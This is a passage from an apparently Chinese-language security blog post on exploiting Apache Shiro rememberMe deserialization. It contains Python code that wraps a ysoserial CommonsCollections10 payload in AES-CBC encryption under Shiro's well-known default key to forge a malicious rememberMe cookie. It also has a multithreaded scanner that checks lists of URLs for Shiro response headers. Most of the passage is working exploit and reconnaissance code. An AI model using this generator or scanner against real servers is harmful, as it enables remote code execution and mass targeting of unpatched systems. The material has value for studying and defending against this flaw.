    def decode(target):
        realkey = base64.b64decode(key)  #解密key
        targetText = base64.b64decode(target) # 想要解密的密文
        iv = targetText[0:16]
        realText = targetText[16:]
        mode = AES.MODE_CBC
        resultAES = AES.new(realkey, mode, iv)# 初始化AES参数
        nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #解密密文并设置忽略一些错误防止报错
        print("\n解密目标:\n" + target + "\n\n解密结果:\n" + nice + "\n")
然后是加上
使用ysoserial生成的java存在反序列化漏洞依赖库的payload，一个利用代码模子就出来了，优秀的工具已经有很多了，就不一一列举了，to
do里是有整合利用链的想法的，不过yso的cb利用链还在努力自闭中~ 因为我根本就不会java呀 (#^.^#)
，暂时学习了一些需要的前置知识，然后分析了最简单的URLDNS，有时间整理一下学习的笔记在水吧。
    from Crypto.Cipher import AES
    import base64,uuid
    import subprocess
    decodeTarget = 'iDQHUONAt/tMN2mHSjCMkopnzE0hn1QgCkZ4I5YrOg5mgCVhgUeoY9AIYHe1CasY6+YrBDNJ+8sasUal9wRYCxAYplrqO25KIlyC1FG7wKjDg3H0Q98aH2+PW8TGkM/leP9Wzl3wbC9Z2t8Thg8abQQ2n3+TMZ1JKyi79EZQgIH7KBmmcNaYkKuDwgCYZKKWtHp4jnWJ6O1qhBxQOr87J5Z6t6vUCf7axIZ3VArtTCAqnxwZT2v6zaVZjVLxWbo3rkyi+TE8RamCDMwzT20XkvKJ1xhUDI58iheSw7e2KP6ctQ8x0Hx5tCqSbwNB03yXuWSCAArTl58QKTByoBBk3PNjmcMk47u5EPUTTE5TPcoqhGXUEDSpjc7lQDdFQ4jxU+eWRZY3jPJw4gQAoX9LEPpIRhijNeopA0Im0jFjtqg+rr7ysp5D6KChzOpzgpewANWT2VLAYEoyZXVU/+f7mP56Pz2vyucX9DvliVDDS6D9hcSQw4mrW3pBzuy+A7hM'
    encodeTarget = 'root'
    key = 'kPH+bIxk5D2deZiIxcaaaA=='
    def encode(target):
        iv   =  uuid.uuid4().bytes  #用好看的方式随机生成16字节
        # iv = bytes('1111111111111111',encoding='utf-8')
        realkey = base64.b64decode(key)  #解密key
        mode = AES.MODE_CBC
        pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBC模式要求明文长度要是16的倍数，位数不足16位的添加字节补充
        resultAES = AES.new(realkey,mode,iv)
        nice = resultAES.encrypt(pad(target))
        nice = iv + nice
        nice = base64.b64encode(nice)
        print("加密目标:\n" + str(target) + "\n\n加密结果:\n" + nice.decode("utf-8") + "\n")
    def decode(target):
        realkey = base64.b64decode(key)  #解密key
        targetText = base64.b64decode(target) # 想要解密的密文
        iv = targetText[0:16]
        realText = targetText[16:]
        mode = AES.MODE_CBC
        resultAES = AES.new(realkey, mode, iv)# 初始化AES参数
        nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #解密密文并设置忽略一些错误防止报错
        print("\n解密目标:\n" + target + "\n\n解密结果:\n" + nice + "\n")
    popen = subprocess.Popen('java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections10 "sleep-5"', shell=True, stdout=subprocess.PIPE)
    file_body = popen.stdout.read()         #读取生成的payload字节码
    decode(decodeTarget)
    encode(file_body)
### 0x04 shiro组件检测
以前写的一个检测shiro组件的脚本，速度比较快，检测条件在下面
    import requests
    import sys,re
    import threadpool
    #from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings()
    def exp(line):
        header={
        'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
        'Cookie':'a=1;rememberMe=1'
        }
        check_one="rememberMe" #场景1
        check_two="deleteMe" #场景2
        isExist = False
        with open('ScanResult.txt',"a") as f:
            if 'http' not in line:
                line = 'http://'+line
            try:
                x = requests.head(line,headers=header,allow_redirects=False,verify=False,timeout=6) #场景4
                y = str(x.headers)
                z = checkRe(y) 
                a = requests.head(line,headers=header,verify=False,timeout=6) #场景5
                b = str(a.headers)
                c = checkRe(b) 
                if check_one in y or z or check_two in y or c:
                    isExist = True
                if isExist:
                    print("[+ "+"!!! 存在shiro: "+"状态码: "+str(x.status_code)+"   url: "+line)
                    f.write(line+"\n")
                else:
                    print("[- "+"不存在shiro  "+"状态码: "+str(x.status_code)+"  url: "+line)
            except Exception as httperror:
                print("[- "+"目标超时, 疑似不存活: "+"  url: "+line)
    def checkRe(target): #场景3
        pattern = re.compile(u'^re(.*?)Me') 
        result  = pattern.search(target)
        if result:
            return True
        else:
            return False
    def multithreading(funcname, params=[], filename="ip.txt", pools=5):
        works = []
        with open(filename, "r") as f:
            for i in f:
                func_params = [i.rstrip("\n")] + params
                works.append((func_params, None))
        pool = threadpool.ThreadPool(pools)
        reqs = threadpool.makeRequests(funcname, works)
        [pool.putRequest(req) for req in reqs]
        pool.wait()
    def main():
        multithreading(exp, [], "url.txt", 10)  # 默认15线程
        print("全部check完毕，请查看当前目录下的shiro.txt")
    if __name__ == "__main__":
        main()
判定是否存在shiro的条件:
  * 1.发送带有rememberMe=1的cookie，返回http头是否存在rememberMe
  * 2.发送带有rememberMe=1的cookie，返回http头是否存在deleteMe
  * 3.发送带有rememberMe=1的cookie，返回http头是否存在匹配正则`^re(.*?)Me`的
  * 4.发送带有rememberMe=1的cookie，请求时脚本设置成跟随跳转后检测前两项
  * 5.发送带有rememberMe=1的cookie，请求时脚本设置成不跟随跳转检测前两项
一开始写的时候检测条件是检测的rememberMe=deleteMe字符串，因为见过网站返回头是下图这样的(开发祭天)，返回http头是remeberMe=deleteMe
。。就分开检测了字符串，然后还加了个正则保险一点。
有的网站会自动跳转到某个路径显示首页，所以设置了跟随跳转和不跟随跳转，没图脑补吧，检测思路是这样的，有的站的shiro组件存在检测还要是登录页输入账号密码登录时的那个路径或者和post提交有关，所以可以再加个post方式请求的判断条件，还可以学爬虫自动输入账号密码post提交这种的判断条件，具体代码就得自行发挥啦